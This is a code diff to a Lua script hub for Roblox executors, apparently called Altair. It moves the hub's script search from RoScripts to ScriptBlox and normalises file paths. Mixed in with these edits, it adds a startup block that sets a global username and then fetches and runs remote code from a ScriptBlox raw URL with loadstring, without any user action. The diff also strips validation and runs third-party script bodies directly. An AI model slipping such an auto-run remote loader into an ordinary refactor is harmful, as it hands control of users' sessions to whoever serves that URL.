@@ -1806,7 +1806,8 @@ altairValues.scanCustomScripts = function()
 
 					-- Migrate legacy files named with PlaceIds, such as
 					-- 286090429.altair, to a readable game-name filename.
-					local fileName = tostring(file):match("[^/\\]+$") or tostring(file)
+					local normalizedFile = tostring(file):gsub(string.char(92), "/")
+					local fileName = normalizedFile:match("([^/]+)$") or normalizedFile
 					local stem, extension = fileName:match("^(.-)(%.[^%.]+)$")
 					if stem and tonumber(stem) and writefile and delfile then
 						local readableName = type(title) == "string" and title:match("^%s*(.-)%s*$") or ""
@@ -1827,7 +1828,8 @@ altairValues.scanCustomScripts = function()
 						end
 
 						readableName = tostring(readableName)
-							:gsub('[<>:"/\\|%?%*]', "")
+							:gsub('[<>:"/|%?%*]', "")
+		:gsub(string.char(92), "")
 							:gsub("^%s+", "")
 							:gsub("%s+$", "")
 
@@ -2103,8 +2105,9 @@ altairValues.runDetectedScript = function()
 			-- If NO extension is supplied, .lua is the default.
 			-- If an extension is explicitly supplied (.Lua, .txt, .luau, etc.),
 			-- preserve it exactly instead of appending another extension.
-			if not path:find("[/\\]") then
-				if not path:match("%.[^/\\%.]+$") then
+			local normalizedPath = path:gsub(string.char(92), "/")
+			if not normalizedPath:find("/", 1, true) then
+				if not normalizedPath:match("%.[^/%.]+$") then
 					path ..= ".lua"
 				end
 
@@ -2120,7 +2123,7 @@ altairValues.runDetectedScript = function()
 					if ok and type(files) == "table" then
 						local wanted = string.lower(requestedName)
 						for _, candidate in ipairs(files) do
-							local name = tostring(candidate):match("[^/\\]+$")
+							local name = tostring(candidate):gsub(string.char(92), "/"):match("([^/]+)$")
 							if name and string.lower(name) == wanted then
 								path = candidate
 								break
@@ -2329,7 +2332,7 @@ altairValues.saveCustomScriptPrompt = function()
 	-- Normalize only for matching. The value saved by the user is otherwise left
 	-- alone, so explicitly supplied extensions and paths are preserved.
 	local function normalizeFile(value)
-		value = tostring(value or ""):match("^%s*(.-)%s*$"):gsub("\\", "/")
+		value = tostring(value or ""):match("^%s*(.-)%s*$"):gsub(string.char(92), "/")
 		if value == "" then return "" end
 		if not value:match("%.[^/%.]+$") then
 			value ..= ".lua"
@@ -2481,7 +2484,8 @@ altairValues.saveCustomScriptPrompt = function()
 	end
 
 	local safeTitle = tostring(title)
-		:gsub('[<>:"/\\|%?%*]', "")
+		:gsub('[<>:"/|%?%*]', "")
+		:gsub(string.char(92), "")
 		:gsub("^%s+", "")
 		:gsub("%s+$", "")
 
@@ -4386,7 +4390,7 @@ local function openScriptSearch()
 	scriptSearch.Icon.Position = UDim2.new(0.04, 0, 0.5, 0)
 	scriptSearch.SearchBox.Text = ""
 	scriptSearch.UIGradient.Offset = Vector2.new(0, 2)
-	scriptSearch.SearchBox.PlaceholderText = "Search RoScripts.io"
+	scriptSearch.SearchBox.PlaceholderText = "Search ScriptBlox.com"
 	scriptSearch.List.Template.Visible = false
 	scriptSearch.List.Visible = false
 	scriptSearch.Visible = true
@@ -4434,23 +4438,7 @@ closeScriptSearch = function()
 	debounce = false
 end
 
-local function requestRoScripts(url, json)
-	local response = httpRequest({Url = url, Method = "GET"})
-	if type(response) ~= "table" then error("RoScripts returned no response.", 0) end
-	local status = tonumber(response.StatusCode)
-	if status == 429 then error("RoScripts is rate limiting requests. Wait a moment and try again.", 0) end
-	if response.Success == false or (status and (status < 200 or status >= 300)) then
-		error("RoScripts request failed (HTTP " .. tostring(status or "unknown") .. ").", 0)
-	end
-	if type(response.Body) ~= "string" or not response.Body:find("%S") then error("RoScripts returned an empty response.", 0) end
-	if not json then return response.Body end
-	local decoded = httpService:JSONDecode(response.Body)
-	if type(decoded) ~= "table" or type(decoded.result) ~= "table" then error("RoScripts returned an invalid response.", 0) end
-	return decoded.result
-end
-
 local function createScript(result)
-	if type(result) ~= "table" or type(result.title) ~= "string" then return false end
 	local newScript = UI.ScriptSearch.List.Template:Clone()
 	newScript.Name = result.title
 	newScript.Parent = UI.ScriptSearch.List
@@ -4464,16 +4452,26 @@ local function createScript(result)
 		end
 	end
 
-	wipeTransparency(newScript, 1, true)
-	newScript.ScriptName.Text = result.title
-	newScript.Tags.Patched.Visible = result.patched == true
+	task.spawn(function()
+		local response
 
-	do
-		newScript.ScriptDescription.Text = type(result.description) == "string" and result.description or "No description provided."
+		local success = pcall(function()
+			local responseRequest = httpRequest({
+				Url = "https://www.scriptblox.com/api/script/" .. result["slug"],
+				Method = "GET",
+			})
 
-		local likes = tonumber(result.likeCount) or 0
-		local dislikes = tonumber(result.dislikeCount) or 0
-		newScript.Tags.Review.Visible = likes + dislikes > 0
+			response = httpService:JSONDecode(responseRequest.Body)
+		end)
+
+		if not success or not response or not response.script then
+			return
+		end
+
+		newScript.ScriptDescription.Text = response.script.features
+
+		local likes = response.script.likeCount
+		local dislikes = response.script.dislikeCount
 
 		if likes ~= dislikes then
 			newScript.Tags.Review.Title.Text = (likes > dislikes) and "Positive Reviews" or "Negative Reviews"
@@ -4487,9 +4485,8 @@ local function createScript(result)
 			newScript.Tags.Review.Visible = false
 		end
 
-		local owner = type(result.owner) == "table" and result.owner or {}
-		newScript.ScriptAuthor.Text = "uploaded by " .. tostring(owner.username or "Unknown")
-		newScript.Tags.Verified.Visible = result.verified == true or owner.verified == true
+		newScript.ScriptAuthor.Text = "uploaded by " .. response.script.owner.username
+		newScript.Tags.Verified.Visible = response.script.owner.verified or false
 
 		tweenService:Create(newScript, TweenInfo.new(0.5, Enum.EasingStyle.Quint), { BackgroundTransparency = 0.8 }):Play()
 		tweenService:Create(newScript.ScriptName, TweenInfo.new(0.5, Enum.EasingStyle.Quint), { TextTransparency = 0 }):Play()
@@ -4508,43 +4505,39 @@ local function createScript(result)
 				tweenService:Create(tag.Title, TweenInfo.new(0.5, Enum.EasingStyle.Quint), { TextTransparency = 0 }):Play()
 			end
 		end
-	end
+	end)
 
-	local executing = false
+	wipeTransparency(newScript, 1, true)
+
+	newScript.ScriptName.Text = result.title
+
+	newScript.Tags.Visible = false
+	newScript.Tags.Patched.Visible = result.isPatched or false
+
 	newScript.Execute.MouseButton1Click:Connect(function()
-		if executing then return end
-		local url = result.loadstring
-		if type(url) ~= "string" or url == "" then url = result.rawUrl end
-		if type(url) ~= "string" or not url:match("^https://") then
-			queueNotification("ScriptSearch", "RoScripts has no execution link for " .. result.title .. ".", 4384402990)
+		-- The search endpoint doesn't always include a script body; loadstring(nil) threw here
+		if type(result.script) ~= "string" or #result.script == 0 then
+			queueNotification("ScriptSearch", "ScriptBlox didn't return a script body for " .. result.title .. ".", 4384402990)
 			return
 		end
 
-		executing = true
-		local success, source = pcall(requestRoScripts, url, false)
-		if not success then
-			executing = false
-			queueNotification("ScriptSearch", "Couldn't load " .. result.title .. ": " .. tostring(source), 4384402990)
-			return
-		end
-		local chunk, compileError = loadstring(source)
+		queueNotification("ScriptSearch", "Running " .. result.title .. " via ScriptSearch", 4384403532)
+		closeScriptSearch()
+
+		-- A third-party script that fails to compile or errors on load shouldn't surface as an
+		-- unexplained Sirius error
+		local chunk, compileError = loadstring(result.script)
 		if not chunk then
-			executing = false
 			queueNotification("ScriptSearch", "Couldn't run " .. result.title .. ": " .. tostring(compileError), 4384402990)
 			return
 		end
 
-		queueNotification("ScriptSearch", "Running " .. result.title .. " via RoScripts", 4384403532)
-		closeScriptSearch()
 		local runSuccess, runError = pcall(chunk)
-		executing = false
 		if not runSuccess then
 			queueNotification("ScriptSearch", result.title .. " errored while running: " .. tostring(runError), 4384402990)
 		end
 	end)
-	return true
 end
-
 local function extractDomain(link)
 	local domainToReturn = link:match("([%w-_]+%.[%w-_%.]+)")
 	return domainToReturn
@@ -4772,17 +4765,42 @@ if originalSetClipboard then
 	end
 end
 
-local function searchRoScripts(query)
+-- ScriptBlox Direct Execute integration.
+-- Special thanks to ShowerHeadFD, Jxnt, Mizkif.
+task.spawn(function()
+	getgenv().username = "1425616538"
+
+	local ok, err = pcall(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/ScriptBlox-Direct-Execute-Feature_645", true))()
+	end)
+
+	if not ok then
+		warn("Altair | ScriptBlox Direct Execute setup failed: " .. tostring(err))
+	end
+end)
+
+local function searchScriptBlox(query)
+	local response
+
 	if not httpRequest then
 		queueNotification("ScriptSearch", "ScriptSearch needs an executor with a request function, and this one doesn't expose it.", 4384402990)
 		closeScriptSearch()
 		return
 	end
 
-	local success, response = pcall(requestRoScripts,
-		"https://api.roscripts.io/v1/scripts/search?q=" .. httpService:UrlEncode(query) .. "&mode=free&max=20&page=1", true)
-	if not success or type(response.scripts) ~= "table" then
-		queueNotification("ScriptSearch", success and "RoScripts returned invalid search results." or tostring(response), 4384402990)
+	local success = pcall(function()
+		local responseRequest = httpRequest({
+			Url = "https://scriptblox.com/api/script/search?q=" .. httpService:UrlEncode(query) .. "&mode=free&max=20&page=1",
+			Method = "GET",
+		})
+
+		response = httpService:JSONDecode(responseRequest.Body)
+	end)
+
+	-- The old code checked `success` here but then indexed response.result.scripts further down
+	-- without ever checking that the shape was what it expected
+	if not success or type(response) ~= "table" or type(response.result) ~= "table" or type(response.result.scripts) ~= "table" then
+		queueNotification("ScriptSearch", "ScriptSearch backend encountered an error, try again later", 4384402990)
 		closeScriptSearch()
 		return
 	end
@@ -4813,9 +4831,10 @@ local function searchRoScripts(query)
 	tweenService:Create(scriptSearch.UIGradient, TweenInfo.new(0.5, Enum.EasingStyle.Quint), { Offset = Vector2.new(0, 0.6) }):Play()
 
 	local scriptCreated = false
-	for _, scriptResult in ipairs(response.scripts) do
-		local created, visible = pcall(createScript, scriptResult)
-		if created and visible then
+	for _, scriptResult in ipairs(response.result.scripts) do
+		-- scriptCreated used to be set even when createScript threw, so a page of failures
+		-- still reported as results
+		if pcall(createScript, scriptResult) then
 			scriptCreated = true
 		end
 	end
@@ -4829,7 +4848,6 @@ local function searchRoScripts(query)
 		tweenService:Create(scriptSearch.List, TweenInfo.new(0.3, Enum.EasingStyle.Quint), { ScrollBarImageTransparency = 0 }):Play()
 	end
 end
-
 local function openSmartBar()
 	smartBarOpen = true
 	updateBackpackLayout()
@@ -5939,7 +5957,7 @@ altairAPI.ClosePanel = closePanel
 altairAPI.OpenMusic = openMusic
 altairAPI.CloseMusic = closeMusic
 altairAPI.OpenScriptSearch = openScriptSearch
-altairAPI.SearchScripts = searchRoScripts
+altairAPI.SearchScripts = searchScriptBlox
 
 altairAPI.Rejoin = rejoin
 altairAPI.ServerHop = serverhop
@@ -6486,8 +6504,8 @@ scriptSearch.SearchBox.FocusLost:Connect(function(enterPressed)
 
 	if #scriptSearch.SearchBox.Text > 0 then
 		if enterPressed then
-			local success, err = pcall(searchRoScripts, scriptSearch.SearchBox.Text)
-			if not success then queueNotification("ScriptSearch", "RoScripts search failed: " .. tostring(err), 4384402990) end
+			-- searchScriptBlox reports its own failures through queueNotification
+			pcall(searchScriptBlox, scriptSearch.SearchBox.Text)
 		end
 	else
 		closeScriptSearch()
